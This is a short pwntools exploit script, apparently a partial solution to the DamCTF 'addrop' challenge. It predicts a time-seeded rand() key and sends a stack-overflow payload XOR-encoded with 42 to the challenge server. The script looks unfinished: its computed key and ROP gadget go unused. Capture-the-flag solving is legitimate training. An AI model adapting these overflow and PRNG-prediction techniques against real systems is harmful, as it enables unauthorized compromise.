from pwn import *
from ctypes import CDLL
import time


e = ELF("./addrop")
libc = ELF("./libc.so.6")
clibc = CDLL(libc.path)

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("chals.damctf.xyz", 31227)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

now = int(time.time())
clibc.srand(now)

key = clibc.rand()
key ^= (clibc.rand() << 0x15) 
key ^= (clibc.rand() << 0x2a)
key %= 0x100**8

print(hex(key))

debug()

def d(val):
  return p64(val ^ u64(chr(42) * 8))

prdi =   0x004009b3
p.sendlineafter("memfrob?", "B" * 0x48 + d(0x1337))

p.interactive()
